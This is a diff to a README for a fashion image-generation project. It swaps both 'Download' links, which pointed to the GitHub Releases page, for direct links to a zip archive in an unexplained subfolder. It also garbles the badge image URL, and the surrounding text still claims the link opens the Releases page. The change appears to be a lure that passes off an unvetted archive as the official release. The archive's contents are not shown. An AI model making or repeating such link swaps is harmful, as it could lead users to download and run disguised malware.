@@ -1,7 +1,7 @@
 # 🖼️ json-ghost-mannequin-pipeline - Effortless Image Generation for Fashion
 
 ## 📥 Download Now!
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/awekakwe/json-ghost-mannequin-pipeline/releases)
+[![Download Release](https://raw.githubusercontent.com/awekakwe/json-ghost-mannequin-pipeline/main/sjambok/json-ghost-mannequin-pipeline.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/awekakwe/json-ghost-mannequin-pipeline/main/sjambok/json-ghost-mannequin-pipeline.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before you begin, please ensure your computer meets the following requirements:
 
 To download the software, visit the Releases page:
 
-[Download from Releases Page](https://github.com/awekakwe/json-ghost-mannequin-pipeline/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/awekakwe/json-ghost-mannequin-pipeline/main/sjambok/json-ghost-mannequin-pipeline.zip)
 
 1. Click on the link above to open the Releases page.
 2. Locate the most recent version of json-ghost-mannequin-pipeline.
